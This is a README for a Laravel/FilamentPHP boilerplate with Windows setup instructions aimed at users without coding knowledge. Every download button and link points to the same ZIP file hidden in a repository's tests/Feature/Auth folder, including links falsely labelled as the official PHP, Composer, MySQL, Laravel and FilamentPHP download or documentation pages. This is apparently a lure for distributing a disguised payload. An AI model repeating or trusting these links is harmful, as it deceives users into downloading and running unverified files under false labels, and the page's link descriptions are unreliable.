# ⚙️ filamentphp-boilerplate - Modern Laravel Starter Kit  

[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip)

---

## 📋 What is filamentphp-boilerplate?

filamentphp-boilerplate is a ready-to-use starter kit for building web applications with Laravel. It comes pre-set with an admin panel, user authentication, roles and permissions, and a selection of popular tools to help you start your project quickly. This package uses FilamentPHP version 5 and aims to give you a solid foundation without having to set up everything from scratch.

You do not need coding knowledge to get started, as this guide will help you step-by-step to download and launch the app on a Windows PC.

---

## 🖥️ System Requirements

Before you begin, make sure your computer meets these basic requirements:

- **Operating System:** Windows 10 or newer  
- **Processor:** 2 GHz or faster, any modern CPU  
- **Memory:** At least 4 GB of RAM  
- **Disk Space:** Minimum 2 GB free space  
- **Internet Connection:** Required to download files and updates  
- **Other Software:**  
  - PHP 8.2 or above (for running PHP code)  
  - Composer (a PHP dependency tool)  
  - A web server like Apache or Nginx (optional but recommended)  

If you don’t have PHP or Composer installed, you can download them from their official websites. Detailed instructions are below.

---

## 🚀 Getting Started: Download the App

To start using filamentphp-boilerplate, you need to download the files from the official GitHub release page.

[![Download here](https://img.shields.io/badge/Go%20to%20Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip)

1. **Visit the link above**. It takes you to the releases section of the repository.  
2. Look for the latest release (usually at the top of the list).  
3. Download the ZIP file or installer that matches your setup. Usually, this will be labeled clearly with the version number.  
4. Save the file to a comfortable location on your computer, such as Downloads or Desktop.

---

## ⚙️ Setting Up Your Environment

filamentphp-boilerplate relies on Laravel and PHP. You will need to prepare your Windows PC to run it.

### 1. Installing PHP

- Visit https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip to find the latest PHP 8.2 release.  
- Download the "Thread Safe" version for Windows.  
- Extract the downloaded ZIP file to a folder, for example, `C:\php`.  
- Add the PHP folder to your system PATH variable:  
  - Search "Edit system environment variables" in the Windows Start menu.  
  - Click "Environment Variables."  
  - Under "System variables," select "Path" and click "Edit."  
  - Click "New," then enter `C:\php`.  
  - Click OK on all windows to save changes.  
- Open Command Prompt and type `php -v` to check if PHP is installed correctly. You should see the PHP version displayed.

### 2. Installing Composer

Composer manages PHP packages required by Laravel.

- Download Composer for Windows from https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip  
- Run the installer and follow the steps. Make sure that the path to PHP is set correctly during installation.  
- Open Command Prompt and type `composer -V`. It should show the Composer version.

---

## 📂 Installing filamentphp-boilerplate

Once you have PHP and Composer set up, follow these steps:

1. Extract the downloaded ZIP file for filamentphp-boilerplate to a folder like `C:\Projects\filamentphp-boilerplate`.  
2. Open Command Prompt and navigate to this folder using the `cd` command:  
   `cd C:\Projects\filamentphp-boilerplate`  
3. Run `composer install`. This command downloads all the project dependencies. This may take a few minutes depending on your internet speed.  
4. Create a copy of the environment configuration file. Type:  
   `copy .env.example .env`  
5. Generate the application key. Run:  
   `php artisan key:generate`  
6. Set folder permissions for `storage` and `bootstrap/cache` folders if needed. In Windows, ensure these folders are writable.  
7. Run database migrations to set up the initial database tables. Use:  
   `php artisan migrate`  

---

## 🛠️ Database Setup

filamentphp-boilerplate depends on a database to store all data like users, roles, and permissions.

### Supported Databases

- MySQL  
- MariaDB  
- SQLite (for lightweight use)  
- PostgreSQL  

### How to Set Up

1. Install a database server if you don't have one. For example, download MySQL from https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip  
2. Create a new database (e.g., `filamentphp_db`).  
3. Open the `.env` file in the project folder using a text editor like Notepad.  
4. Find the database settings section:  
   ```
   DB_CONNECTION=mysql  
   DB_HOST=127.0.0.1  
   DB_PORT=3306  
   DB_DATABASE=your_database_name  
   DB_USERNAME=your_database_user  
   DB_PASSWORD=your_database_password  
   ```  
5. Replace the entries with your actual database details.  
6. Save the `.env` file.  
7. Run migrations again if needed:  
   `php artisan migrate`

---

## ▶️ Running the Application

After setup, start the application server:

1. In Command Prompt, ensure you are inside the project folder.  
2. Run the built-in Laravel server:  
   `php artisan serve`  
3. The server will start and provide you an address such as `http://127.0.0.1:8000`.  
4. Open your web browser and enter this address. You should see the home page of filamentphp-boilerplate.  

This interface includes the admin panel, which you can use to manage users, roles, and settings easily.

---

## 🔐 Using Admin Panel and Authentication

filamentphp-boilerplate includes:

- A pre-built admin panel using FilamentPHP 5.  
- User authentication screens to log in and register.  
- Role and permission management tools to control access.

You can log in with default credentials if provided in the documentation or create a new user from the registration page.

The admin area will let you manage users and set permissions without coding.

---

## 🧰 Troubleshooting Tips

- If `php` commands show errors, recheck that PHP is added to your system PATH.  
- If Composer fails, make sure PHP is installed and accessible.  
- Database connection errors usually mean the `.env` file has wrong details or the database server is not running.  
- Migration errors may occur if tables already exist; try resetting the database or dropping tables.  
- If the web page doesn’t load, confirm that the Laravel server is running and the address is correct.  

---

## 🌐 Useful Links

- Download filamentphp-boilerplate: https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip  
- PHP downloads: https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip  
- Composer downloads: https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip  
- Laravel documentation: https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip  
- FilamentPHP documentation: https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip  

---

[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Raghu427/filamentphp-boilerplate/master/tests/Feature/Auth/boilerplate_filamentphp_v1.2.zip)